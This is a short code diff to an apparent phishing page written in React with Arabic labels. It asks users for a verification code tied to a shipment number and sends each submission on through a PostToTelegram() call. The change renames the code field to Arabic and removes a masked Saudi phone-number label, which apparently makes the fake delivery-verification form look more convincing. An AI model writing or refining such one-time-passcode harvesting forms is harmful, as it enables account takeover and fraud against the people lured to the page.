@@ -14,7 +14,7 @@ const Code = () => {
   const datas = x.get("names")
   const [form,setForm]=useState({
     data:{
-      code:"",
+      كود_التحقق:"",
       رقم_الشحنة:datas
     }
   })
@@ -58,9 +58,8 @@ const Code = () => {
         e.preventDefault();
         PostToTelegram()
       }}>
-        <label dir='ltr'>
-        +966*********</label>
-        <input type="text" name="code" onChange={(e) => {
+        
+        <input type="text" name="كود_التحقق" onChange={(e) => {
                   const { name, value } = e.target;
                   setDynamicFormData(name, value);
                 }} placeholder="ادخل كود التحقق" />
